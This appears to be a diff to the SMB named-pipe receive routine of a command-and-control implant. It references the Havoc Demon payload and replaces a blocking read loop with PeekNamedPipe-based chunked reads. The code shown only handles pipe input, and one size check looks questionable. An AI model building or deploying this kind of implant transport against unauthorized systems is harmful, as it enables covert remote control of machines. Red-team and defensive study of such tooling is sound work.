@@ -97,78 +97,62 @@ END:
  */
 BOOL SmbRecieve(PBYTE* ppOutData, SIZE_T* pOutLen)
 {
-    BOOL  Success   = FALSE;
-    DWORD bytesRead = 0;
-    DWORD totalRead = 0;
-    DWORD chunkSize = 4096;
-    BYTE  buffer[4096];
+    DWORD BytesSize   = 0;
+    DWORD BytesRead   = 0;
+    DWORD PackageSize = 0;
+    DWORD Total       = 0;
+    PVOID Buffer      = NULL;
 
-    *ppOutData = NULL;
-    *pOutLen   = 0;
-
-    // This call will block until data is available (PIPE_WAIT)
-    while (TRUE)                                                                // TODO - Change this to not BLOCK. Cause we want the agent to sleep ...
-                                                                                // https://github.com/HavocFramework/Havoc/blob/main/payloads/Demon/src/core/TransportSmb.c#L65
+    if ( PeekNamedPipe( xenonConfig->SmbPipe, NULL, 0, NULL, &PackageSize, NULL ) )
     {
-        BOOL result = ReadFile(xenonConfig->SmbPipe, buffer, chunkSize, &bytesRead, NULL);
-        if (!result)
+        _dbg("PeekNamedPipe found: %d bytes", PackageSize);
+
+        if ( PackageSize > sizeof(TASK_UUID_SIZE))
         {
-            DWORD err = GetLastError();
+            /* Dynamically allocated to handle any size */
+            Buffer = LocalAlloc(LPTR, PackageSize);
 
-            if (err == ERROR_MORE_DATA)
-            {
-                // Message is larger than our buffer — append and continue
-            }
-            else if (err == ERROR_BROKEN_PIPE)
-            {
-                printf("Pipe closed by the other end.\n");
-                goto END;
-            }
-            else
-            {
-                printf("ReadFile failed with %lu\n", err);
-                goto END;
-            }
+            /* Try to read the whole message */
+            do {
+                if ( !ReadFile(xenonConfig->SmbPipe, (Buffer + Total), MIN((PackageSize - Total), PIPE_BUFFER_MAX), &BytesRead, NULL) ) 
+                {
+                    if ( GetLastError() != ERROR_MORE_DATA ) 
+                    {
+                        _err("ReadFile failed with %d", GetLastError());
+                        LocalFree(Buffer);
+                        *ppOutData  = NULL;
+                        *pOutLen    = 0;
+                        return FALSE;
+                    }
+                }
+
+                Total += BytesRead;
+            } while ( Total < PackageSize );
+            
+            /* Output */
+            *ppOutData = Buffer;
+            *pOutLen = PackageSize;
+
+            
+            _dbg("Successfully read 0x%x bytes from pipe", PackageSize);
         }
-
-        if (bytesRead > 0)
+        else if ( PackageSize > 0 )
         {
-            // Expand destination buffer
-            PBYTE newBuf = (PBYTE)LocalAlloc(LPTR, totalRead + bytesRead);
-            if (!newBuf)
-            {
-                printf("LocalAlloc failed.\n");
-                goto END;
-            }
-
-            if (*ppOutData)
-            {
-                memcpy(newBuf, *ppOutData, totalRead);
-                LocalFree(*ppOutData);
-            }
-
-            memcpy(newBuf + totalRead, buffer, bytesRead);
-            *ppOutData = newBuf;
-            totalRead += bytesRead;
+            _err("Data in the pipe is too small: %d bytes", PackageSize);
         }
-
-        // Exit loop when the message has been fully read
-        if (result || GetLastError() == ERROR_BROKEN_PIPE)
-            break;
+        else
+        {
+            // Nothing in the pipe
+        }
+    }
+    else
+    {
+        /* We disconnected */
+        _err("PeekNamedPipe failed with %d\n", GetLastError());
+        return FALSE;
     }
 
-    *pOutLen = totalRead;
-    Success = TRUE;
-
-END:
-    if (!Success && *ppOutData)
-    {
-        LocalFree(*ppOutData);
-        *ppOutData = NULL;
-        *pOutLen   = 0;
-    }
-
-    return Success;
+    return TRUE;
 }
 
 
